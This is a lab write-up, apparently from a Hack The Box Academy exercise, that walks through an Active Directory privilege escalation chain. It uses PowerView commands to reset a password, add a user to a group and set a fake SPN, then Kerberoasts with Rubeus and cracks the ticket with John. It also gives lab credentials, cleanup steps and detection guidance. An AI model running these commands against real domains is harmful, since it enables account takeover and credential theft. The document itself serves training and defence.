# ACL Abuse - Active Directory Privilege Escalation

> **Educational Purpose:**  
> This documentation explains how misconfigured Active Directory permissions can create privilege escalation paths during authorized security assessments and lab environments.

---

# Lab Objective

The goal of this lab is to identify and abuse dangerous Active Directory permissions to gain control over a privileged user account.

Attack chain:

```
svc_qualys
    |
    | ForceChangePassword
    ↓
damundsen
    |
    | GenericWrite
    ↓
Help Desk Level 1
    |
    | Nested Group Membership
    ↓
Information Technology
    |
    | GenericAll
    ↓
adunn
    |
    | Fake SPN
    ↓
Kerberoasting
    |
    | Offline Password Cracking
    ↓
Account Compromise
```

---

# What Are ACLs?

Active Directory Access Control Lists (ACLs) define who can perform actions on objects such as:

- Users
- Groups
- Computers
- Organizational Units

A misconfigured ACL can allow a low-privileged user to perform powerful actions.

Examples of dangerous permissions:

| Permission | Impact |
|---|---|
| ForceChangePassword | Reset another user's password |
| GenericWrite | Modify object attributes |
| GenericAll | Full control over an object |
| WriteDACL | Modify permissions |
| WriteOwner | Take ownership |
| DCSync | Extract domain password hashes |

---

# Attack Path

| Step | Object | Permission | Result |
|---|---|---|---|
| 1 | svc_qualys → damundsen | ForceChangePassword | Reset user password |
| 2 | damundsen → Help Desk Level 1 | GenericWrite | Modify group membership |
| 3 | Help Desk Level 1 → Information Technology | Nested Group | Inherit permissions |
| 4 | Information Technology → adunn | GenericAll | Full account control |
| 5 | adunn | ServicePrincipalName modification | Kerberoasting opportunity |

---

# Tools Used

| Tool | Purpose |
|---|---|
| PowerView | Active Directory enumeration and ACL abuse |
| BloodHound | Visualizing permission attack paths |
| Rubeus | Kerberos ticket requests |
| John the Ripper | Offline password cracking |

---

# Step 1 - Access Windows Host

Connect to the target machine:

```bash
xfreerdp /v:10.129.51.167 /u:htb-student /p:Academy_student_AD!
```

---

# Step 2 - Load PowerView

Navigate to the tools directory:

```powershell
cd C:\Tools
```

Import PowerView:

```powershell
Import-Module .\PowerView.ps1
```

PowerView provides functions to:

- Enumerate users
- Enumerate groups
- Find ACL permissions
- Abuse delegated privileges

---

# Step 3 - Authenticate as svc_qualys

The account:

```
svc_qualys
```

has:

```
ForceChangePassword
```

permission over:

```
damundsen
```

Create credentials:

```powershell
$SecPassword = ConvertTo-SecureString 'security#1' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(
'INLANEFREIGHT\svc_qualys',
$SecPassword
)
```

---

# Step 4 - Abuse ForceChangePassword

Because svc_qualys has permission to reset damundsen's password, we can change it.

Create a new password:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Reset password:

```powershell
Set-DomainUserPassword `
-Identity damundsen `
-AccountPassword $damundsenPassword `
-Credential $Cred `
-Verbose
```

Expected output:

```text
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

---

# Step 5 - Authenticate as damundsen

Create credentials:

```powershell
$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential(
'INLANEFREIGHT\damundsen',
$SecPassword2
)
```

---

# Step 6 - Abuse GenericWrite

The account:

```
damundsen
```

has:

```
GenericWrite
```

permissions over:

```
Help Desk Level 1
```

This allows modification of the group.

Add damundsen:

```powershell
Add-DomainGroupMember `
-Identity 'Help Desk Level 1' `
-Members 'damundsen' `
-Credential $Cred2 `
-Verbose
```

Expected output:

```text
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

---

# Step 7 - Verify Group Membership

Confirm the account was added:

```powershell
Get-DomainGroupMember `
-Identity "Help Desk Level 1" |
Select-Object MemberName |
Where-Object {$_.MemberName -eq "damundsen"}
```

Expected result:

```text
MemberName
----------
damundsen
```

---

# Step 8 - Abuse Nested Group Permissions

The relationship:

```
damundsen
     |
     ↓
Help Desk Level 1
     |
     ↓
Information Technology
```

allows inherited permissions.

The group:

```
Information Technology
```

has:

```
GenericAll
```

over:

```
adunn
```

GenericAll provides full control over the account.

---

# Step 9 - Add Fake SPN to adunn

Kerberoasting requires an account with an SPN.

Create a fake SPN:

```powershell
Set-DomainObject `
-Credential $Cred2 `
-Identity adunn `
-SET @{serviceprincipalname='notahacker/LEGIT'} `
-Verbose
```

Expected output:

```text
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

---

# Why Create a Fake SPN?

Kerberos service tickets are generated for accounts with SPNs.

Attack flow:

```
adunn
 |
 | SPN added
 ↓
Kerberos Service Account
 |
 ↓
TGS Request
 |
 ↓
Encrypted Ticket
 |
 ↓
Offline Password Audit
```

---

# Step 10 - Kerberoast adunn

Using Rubeus:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

Example output:

```text
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$2C3724E238032A66CA962E839D4EC934...
```

---

# Step 11 - Save Hash

Move the hash to Linux:

```bash
echo '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$...' > adunn_hash.txt
```

---

# Step 12 - Crack Kerberos Hash

Using John the Ripper:

```bash
john \
--format=krb5tgs \
--wordlist=/usr/share/wordlists/rockyou.txt \
adunn_hash.txt
```

Show recovered password:

```bash
john --show adunn_hash.txt
```

Example:

```text
adunn_hash.txt:adunn:[PASSWORD]

1 password hash cracked, 0 left
```

---

# Cleanup

Always restore the environment after testing.

Remove fake SPN:

```powershell
Set-DomainObject `
-Credential $Cred2 `
-Identity adunn `
-Clear serviceprincipalname `
-Verbose
```

Remove user from group:

```powershell
Remove-DomainGroupMember `
-Identity "Help Desk Level 1" `
-Members 'damundsen' `
-Credential $Cred2 `
-Verbose
```

---

# Detection Opportunities

Security teams can detect ACL abuse by monitoring:

| Event ID | Description |
|---|---|
| 4724 | Password reset attempt |
| 4728 | User added to security group |
| 4732 | User added to local group |
| 5136 | Directory object modification |
| 4769 | Kerberos service ticket request |

Monitor for:

- Unexpected password changes
- Group membership changes
- SPN modifications
- Abnormal Kerberos requests
- Privilege escalation paths

---

# Defensive Recommendations

Organizations should:

- Regularly audit Active Directory ACL permissions
- Remove unnecessary delegated privileges
- Apply least privilege principles
- Monitor privileged groups
- Protect service accounts
- Use Group Managed Service Accounts (gMSA)
- Review BloodHound attack paths
- Disable unnecessary SPNs

---

# Key Takeaways

- Active Directory security depends heavily on permissions.
- Low-privileged users can become powerful through ACL chains.
- ForceChangePassword can lead to account takeover.
- GenericWrite can allow dangerous modifications.
- GenericAll provides complete object control.
- Nested groups can silently transfer privileges.
- ACL auditing is essential for preventing privilege escalation.

---

# References

- MITRE ATT&CK - T1558.003 Kerberoasting
- Microsoft Active Directory Security Documentation
- BloodHound Documentation
- PowerView Documentation
